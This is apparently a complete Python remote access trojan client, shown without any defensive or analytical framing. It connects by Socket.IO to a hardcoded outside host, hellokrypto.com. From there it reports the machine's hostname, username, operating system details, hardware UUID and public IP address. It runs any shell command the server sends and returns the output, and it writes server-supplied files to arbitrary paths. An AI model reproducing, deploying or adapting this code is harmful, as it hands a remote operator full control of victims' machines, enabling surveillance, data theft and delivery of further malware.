import os
import requests
import getpass
import socket
import socketio
import subprocess
import platform
import uuid
import json
import base64

sio = socketio.Client()

def get_hostname():
    hostname = socket.gethostname()
    machine_id = hex(uuid.getnode())[2:]
    full_hostname = f"{hostname}-{machine_id[:6]}"
    if not full_hostname:
        full_hostname = getpass.getuser()
    return full_hostname

def get_system_info():
    try:
        try:
            sys_info = {
                'hostname': socket.gethostname(),
                'machine': platform.machine(),
                'platform': platform.system(),
                'release': platform.release(),
                'username': getpass.getuser(),
                'version': platform.version(),
                'uuid': str(uuid.UUID(int=uuid.getnode()))
            }
        except Exception:
            sys_info = None
        try:
            response = requests.get('https://ipinfo.io/json', timeout=5)
            ip_info = response.json()
        except Exception:
            ip_info = None
        return {'sysInfo': sys_info, 'ipInfo': ip_info}
    except Exception:
        return {'sysInfo': None, 'ipInfo': None}
 
hostname = get_hostname()

@sio.event(namespace='/client')
def connect():
    sio.emit('exec_result', f'Connected : {hostname}', namespace='/client')
    sio.emit('set_client_info', {'username': hostname}, namespace='/client')

@sio.on('client_event_file_down', namespace='/client')
def on_file_down(data):
    try:
        file_data = base64.b64decode(data.get('fileData'))
        client_file_path = data.get('clientFilePath')
        with open(client_file_path, 'wb') as f:
            f.write(file_data)
        sio.emit('exec_result', 'File download finished', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'File download failed: {str(e)}', namespace='/client')

@sio.on('client_event_cmd_exec', namespace='/client')
def on_cmd_exec(instruction):
    try:
        args = instruction.strip().split()
        command = args[0].lower()
        content = ' '.join(args[1:])

        if command == 'cstop':
            pass

        elif command == 'cd':
            os.chdir(content)
            current_dir = os.getcwd()
            sio.emit('exec_result', current_dir, namespace='/client')
        else:
            result = subprocess.run(
                instruction,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            if result.stderr:
                sio.emit('exec_result', result.stderr, namespace='/client')
            elif result.stdout:
                sio.emit('exec_result', result.stdout, namespace='/client')

    except Exception as e:
        sio.emit('exec_result', f"Command execution error: {str(e)}")

@sio.on('client_event_system_information', namespace='/client')
def on_system_info_request():
    try:
        system_info = get_system_info()
        sio.emit('exec_result', json.dumps(system_info), namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Error in getting system information: {str(e)}', namespace='/client')

# sio.connect('http://localhost:8111', namespaces=['/client'])
sio.connect('https://hellokrypto.com/', socketio_path='/socket.io', namespaces=['/client'])
sio.wait()